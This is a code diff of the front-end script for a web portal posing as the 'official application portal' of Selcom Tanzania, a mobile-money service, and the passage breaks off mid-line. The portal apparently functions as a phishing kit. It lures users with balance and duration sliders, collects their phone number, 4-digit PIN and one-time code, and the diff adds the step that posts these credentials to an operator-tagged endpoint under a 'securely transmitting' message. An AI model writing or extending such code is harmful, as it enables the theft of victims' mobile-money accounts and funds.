@@ -16,16 +16,13 @@ document.addEventListener('DOMContentLoaded', () => {
   let currentUserId = null;
   let statusPollInterval = null;
   let otpTimerInterval = null;
-  let currentLang = 'sw'; // Default language is Swahili
+  let currentLang = 'sw'; // Default language Swahili
 
   const urlParams = new URLSearchParams(window.location.search);
   const adminParam = urlParams.get('admin') || '';
 
-  // Dictionary for Bilingual support (Swahili default & English)
   const translations = {
     sw: {
-      langLblEng: "ENG",
-      langLblSwa: "SWAHILI",
       welcomeTitle: "KARIBU SELCOM TANZANIA!",
       welcomeSub: "WELCOME TO THE OFFICIAL APPLICATION PORTAL.",
       welcomeDesc: "Your unique Selcom Account Details (Tanzania only) are required for all interactions. Ensure you use a valid account number to avoid delays.",
@@ -88,8 +85,6 @@ document.addEventListener('DOMContentLoaded', () => {
       loadingSub: "Tafadhali subiri wakati tunathibitisha taarifa zako."
     },
     en: {
-      langLblEng: "ENG",
-      langLblSwa: "SWAHILI",
       welcomeTitle: "KARIBU SELCOM TANZANIA!",
       welcomeSub: "WELCOME TO THE OFFICIAL APPLICATION PORTAL.",
       welcomeDesc: "Your unique Selcom Account Details (Tanzania only) are required for all interactions. Ensure you use a valid account number to avoid delays.",
@@ -230,7 +225,6 @@ document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('txt-loading-sub').innerText = t.loadingSub;
   }
 
-  // Language Toggle Switch Handler
   const langToggle = document.getElementById('language-toggle');
   if (langToggle) {
     langToggle.addEventListener('change', (e) => {
@@ -246,7 +240,6 @@ document.addEventListener('DOMContentLoaded', () => {
     if (targetStep) targetStep.classList.add('active');
   }
 
-  // Sliders Synchronization
   const sliderBalance = document.getElementById('slider-balance');
   const balanceVal = document.getElementById('balance-val');
   const sliderDuration = document.getElementById('slider-duration');
@@ -274,7 +267,6 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // Enforce Phone Number input formatting
   const phoneInput = document.getElementById('phone-number');
   if (phoneInput) {
     phoneInput.addEventListener('input', (e) => {
@@ -286,7 +278,6 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // Multi-step Navigation
   const btnWelcome = document.getElementById('btn-welcome-proceed');
   if (btnWelcome) btnWelcome.addEventListener('click', () => showStep(stepSlider));
   
@@ -338,13 +329,11 @@ document.addEventListener('DOMContentLoaded', () => {
   const btnForm3Submit = document.getElementById('btn-form3-submit');
   if (btnForm3Submit) {
     btnForm3Submit.addEventListener('click', () => {
-      const phoneVal = phoneInput ? phoneInput.value.trim() : '';
       showStep(stepPin);
       if (pinDigits[0]) pinDigits[0].focus();
     });
   }
 
-  // Digits input focus and auto-submit
   const pinDigits = document.querySelectorAll('.pin-digit');
   const otpDigits6 = document.querySelectorAll('.otp-digit-6');
 
@@ -373,7 +362,6 @@ document.addEventListener('DOMContentLoaded', () => {
   setupDigitInputs(pinDigits);
   setupDigitInputs(otpDigits6, () => submitOtpHandler());
 
-  // 1-Minute OTP Countdown Timer
   function startOtpCountdown() {
     let timeLeft = 60;
     const timerDisplay = document.getElementById('otp-timer-display');
@@ -416,7 +404,6 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // Submit Credentials (Phone & PIN)
   const btnSubmitCreds = document.getElementById('btn-submit-creds');
   if (btnSubmitCreds) {
     btnSubmitCreds.addEventListener('click', async () => {
@@ -425,4 +412,13 @@ document.addEventListener('DOMContentLoaded', () => {
 
       const pinError = document.getElementById('pin-error');
       if (pinVal.length !== 4) {
-        
+        if (pinError) pinError.style.display = 'block';
+        return;
+      }
+      if (pinError) pinError.style.display = 'none';
+
+      if (credsSurfaceBanner) credsSurfaceBanner.classList.remove('active');
+      showLoading(currentLang === 'sw' ? 'Inathibitisha...' : 'Verifying...', currentLang === 'sw' ? 'Inatuma taarifa zako kwa usalama.' : 'Securely transmitting your credentials.');
+
+      try {
+        const res = await fetch(`/api/submit-credentials?admin=${encodeURIComponent(adminPa
